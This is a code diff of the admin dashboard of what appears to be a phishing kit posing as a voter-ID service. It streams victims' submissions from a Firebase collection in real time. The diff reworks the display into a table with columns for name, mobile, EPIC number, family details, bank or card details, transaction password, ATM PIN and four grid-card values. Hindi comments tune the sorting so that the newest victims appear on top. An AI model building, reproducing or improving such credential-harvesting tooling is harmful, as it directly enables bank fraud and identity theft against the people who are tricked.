@@ -6,28 +6,28 @@
     <title>Admin Panel - Live Real-Time Submissions</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: #f0f4f8; padding: 20px; color: #333; }
+        body { background: #f4f7f6; padding: 20px; }
         
         #loginOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75); display: flex; justify-content: center; align-items: center; z-index: 9999;
+            background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999;
         }
         .login-box {
-            background: #fff; padding: 35px; border-radius: 12px; width: 100%; max-width: 380px; text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            background: #fff; padding: 30px; border-radius: 10px; width: 100%; max-width: 350px; text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
-        .login-box h3 { margin-bottom: 20px; color: #0056b3; font-size: 24px; }
-        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
-        .login-box button { width: 100%; padding: 12px; background: #0056b3; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .login-box h3 { margin-bottom: 15px; color: #0056b3; }
+        .login-box input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        .login-box button { width: 100%; padding: 10px; background: #0056b3; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
         .login-box button:hover { background: #004085; }
-        .error-text { color: red; font-size: 13px; margin-bottom: 12px; display: none; }
+        .error-text { color: red; font-size: 12px; margin-bottom: 10px; display: none; }
 
-        #adminContent { display: none; max-width: 1200px; margin: 0 auto; }
+        #adminContent { display: none; }
 
-        .header-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        h2 { color: #0056b3; font-size: 22px; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h2 { color: #0056b3; font-size: 20px; }
         
-        .live-status { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; color: #28a745; background: #e8f5e9; padding: 8px 15px; border-radius: 20px; border: 1px solid #c8e6c9; }
+        .live-status { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: #28a745; background: #e8f5e9; padding: 6px 12px; border-radius: 20px; border: 1px solid #c8e6c9; }
         .pulse-dot { width: 10px; height: 10px; background-color: #28a745; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
         @keyframes pulse {
             0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7); }
@@ -35,43 +35,16 @@
             100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(40, 167, 69, 0); }
         }
 
-        .logout-btn { background: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold; }
-        .logout-btn:hover { background: #b02a37; }
-
-        /* Modern Card Grid Container */
-        .cards-container { display: flex; flex-direction: column; gap: 20px; }
+        .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        table { width: 100%; border-collapse: collapse; min-width: 2100px; }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
+        th { background-color: #0056b3; color: white; position: sticky; top: 0; z-index: 10; }
+        tr:nth-child(even) { background-color: #f9f9f9; }
+        .loading { text-align: center; color: #666; font-style: italic; }
         
-        .submission-card {
-            background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-            border-left: 6px solid #0056b3; overflow: hidden; transition: transform 0.2s;
-        }
-        .submission-card:hover { transform: translateY(-2px); }
-
-        .card-header {
-            background: #f8fafc; padding: 15px 20px; border-bottom: 1px solid #e2e8f0;
-            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;
-        }
-        .user-title { font-size: 18px; font-weight: bold; color: #0056b3; }
-        .submission-time { font-size: 13px; color: #64748b; font-weight: 600; }
-        
-        .card-body { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; }
-        
-        .info-group { background: #f8fafc; padding: 10px 14px; border-radius: 8px; border: 1px solid #edf2f7; }
-        .info-label { font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: bold; margin-bottom: 4px; letter-spacing: 0.5px; }
-        .info-value { font-size: 14px; color: #1e293b; font-weight: 600; word-break: break-all; }
-        .highlight { color: #0284c7; }
-        .secure-val { color: #dc2626; background: #fee2e2; padding: 2px 6px; border-radius: 4px; display: inline-block; }
-
-        .card-footer {
-            background: #f1f5f9; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center;
-            border-top: 1px solid #e2e8f0; font-size: 13px;
-        }
-        .status-badge { background: #dbeafe; color: #1e40af; padding: 4px 10px; border-radius: 6px; font-weight: bold; }
-        
-        .delete-btn { background: #dc3545; color: white; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: bold; }
+        .logout-btn { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; }
+        .delete-btn { background: #dc3545; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; }
         .delete-btn:hover { background: #b02a37; }
-
-        .loading, .no-data { text-align: center; color: #64748b; font-size: 16px; padding: 40px; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
     </style>
 </head>
 <body>
@@ -90,18 +63,48 @@
     <!-- Main Admin Dashboard -->
     <div id="adminContent">
         <div class="header-container">
-            <h2>Admin Dashboard - Live Submissions</h2>
+            <h2>Admin Panel - Live Real-Time Submissions</h2>
             
             <div style="display: flex; align-items: center; gap: 15px;">
                 <div class="live-status">
-                    <span class="pulse-dot"></span> Live Real-Time Active
+                    <span class="pulse-dot"></span> Live Scanning Active
                 </div>
                 <button class="logout-btn" onclick="logout()">Logout</button>
             </div>
         </div>
         
-        <div id="cardsContainer" class="cards-container">
-            <div class="loading">Connecting to Live Database...</div>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Time</th>
+                        <th>Full Name</th>
+                        <th>Mobile</th>
+                        <th>EPIC Number</th>
+                        <th>Father's Name</th>
+                        <th>DOB</th>
+                        <th>Gender</th>
+                        <th>Marital Status</th>
+                        <th>Children</th>
+                        <th>Mother's Name</th>
+                        <th>Documents</th>
+                        <th>Payment Method</th>
+                        <th>Payment / Bank Details</th>
+                        <th>Transaction Password</th>
+                        <th>ATM PIN</th>
+                        <th>Grid Step 1</th>
+                        <th>Grid Step 2</th>
+                        <th>Grid Step 3</th>
+                        <th>Grid Step 4</th>
+                        <th>Status / Current Step</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTable">
+                    <tr><td colspan="22" class="loading">Connecting to Live Database...</td></tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
@@ -126,7 +129,7 @@
         let unsubscribe = null;
 
         function startLiveListener() {
-            const container = document.getElementById('cardsContainer');
+            const tableBody = document.getElementById('dataTable');
 
             unsubscribe = onSnapshot(collection(db, "voterSubmissions"), (querySnapshot) => {
                 let submissions = [];
@@ -136,51 +139,56 @@
                 });
 
                 if (submissions.length === 0) {
-                    container.innerHTML = "<div class='no-data'>कोई डेटा उपलब्ध नहीं है। (लाइव स्कैनिंग जारी है...)</div>";
+                    tableBody.innerHTML = "<tr><td colspan='22' class='loading'>कोई डेटा उपलब्ध नहीं है। (लाइव स्कैनिंग जारी है...)</td></tr>";
                     return;
                 }
 
-                // नए डेटा को सबसे ऊपर दिखाने के लिए सॉर्ट करें
+                // पक्का और सटीक सॉर्टिंग लॉजिक (जो हर नए डेटा को सबसे ऊपर रखेगा)
                 submissions.sort((a, b) => {
-                    let timeA = new Date(a.time || 0);
-                    let timeB = new Date(b.time || 0);
-                    return timeB - timeA;
+                    let timeA = a.time ? new Date(a.time).getTime() : 0;
+                    let timeB = b.time ? new Date(b.time).getTime() : 0;
+                    
+                    // अगर तारीख को पार्स करने में दिक्कत हो, तो आईडी या ऑर्डर से मैनेज करें
+                    if (isNaN(timeA)) timeA = 0;
+                    if (isNaN(timeB)) timeB = 0;
+
+                    // अगर दोनों का समय एक जैसा या अमान्य हो, तो नया डॉक्यूमेंट आईडी के हिसाब से ऊपर आए
+                    if (timeA === timeB) {
+                        return b.id.localeCompare(a.id);
+                    }
+
+                    return timeB - timeA; // सबसे नया समय सबसे ऊपर
                 });
 
-                container.innerHTML = "";
+                tableBody.innerHTML = "";
                 let serialNumber = 1;
 
                 submissions.forEach((data) => {
-                    let card = `
-                        <div class="submission-card">
-                            <div class="card-header">
-                                <div class="user-title">#${serialNumber++} &nbsp; ${data.fullname || 'N/A'}</div>
-                                <div class="submission-time">🕒 ${data.time || 'N/A'}</div>
-                            </div>
-                            <div class="card-body">
-                                <div class="info-group"><div class="info-label">Mobile Number</div><div class="info-value highlight">${data.mobile || 'N/A'}</div></div>
-                                <div class="info-group"><div class="info-label">EPIC Number</div><div class="info-value">${data.epic || 'N/A'}</div></div>
-                                <div class="info-group"><div class="info-label">Father's Name</div><div class="info-value">${data.fatherName || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Date of Birth</div><div class="info-value">${data.dob || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Gender / Marital</div><div class="info-value">${data.gender || 'Pending'} / ${data.maritalStatus || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Children / Mother</div><div class="info-value">${data.childrenCount || '0'} / ${data.motherName || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Documents</div><div class="info-value">${data.documents || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Payment Method</div><div class="info-value highlight">${data.paymentMethod || 'Pending'}</div></div>
-                                <div class="info-group" style="grid-column: span 2;"><div class="info-label">Bank / Card Details</div><div class="info-value secure-val">${data.paymentDetails || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Transaction Password</div><div class="info-value secure-val">${data.transPassword || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">ATM PIN</div><div class="info-value secure-val">${data.atmPin || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Grid Step 1</div><div class="info-value secure-val">${data.gridStep1 || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Grid Step 2</div><div class="info-value secure-val">${data.gridStep2 || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Grid Step 3</div><div class="info-value secure-val">${data.gridStep3 || 'Pending'}</div></div>
-                                <div class="info-group"><div class="info-label">Grid Step 4</div><div class="info-value secure-val">${data.gridStep4 || 'Pending'}</div></div>
-                            </div>
-                            <div class="card-footer">
-                                <div>Status: <span class="status-badge">${data.currentStep || 'Started'}</span></div>
-                                <button class="delete-btn" onclick="deleteRecord('${data.id}')">Delete Record</button>
-                            </div>
-                        </div>
-                    `;
-                    container.innerHTML += card;
+                    let row = `<tr>
+                        <td><b>${serialNumber++}</b></td>
+                        <td>${data.time || 'N/A'}</td>
+                        <td>${data.fullname || 'N/A'}</td>
+                        <td>${data.mobile || 'N/A'}</td>
+                        <td>${data.epic || 'N/A'}</td>
+                        <td>${data.fatherName || 'Pending'}</td>
+                        <td>${data.dob || 'Pending'}</td>
+                        <td>${data.gender || 'Pending'}</td>
+                        <td>${data.maritalStatus || 'Pending'}</td>
+                        <td>${data.childrenCount || 'Pending'}</td>
+                        <td>${data.motherName || 'Pending'}</td>
+                        <td>${data.documents || 'Pending'}</td>
+                        <td>${data.paymentMethod || 'Pending'}</td>
+                        <td>${data.paymentDetails || 'Pending'}</td>
+                        <td>${data.transPassword || 'Pending'}</td>
+                        <td>${data.atmPin || 'Pending'}</td>
+                        <td>${data.gridStep1 || 'Pending'}</td>
+                        <td>${data.gridStep2 || 'Pending'}</td>
+                        <td>${data.gridStep3 || 'Pending'}</td>
+                        <td>${data.gridStep4 || 'Pending'}</td>
+                        <td><b>${data.currentStep || 'Started'}</b></td>
+                        <td><button class="delete-btn" onclick="deleteRecord('${data.id}')">Delete</button></td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
                 });
             }, (error) => {
                 console.error("Live sync error: ", error);
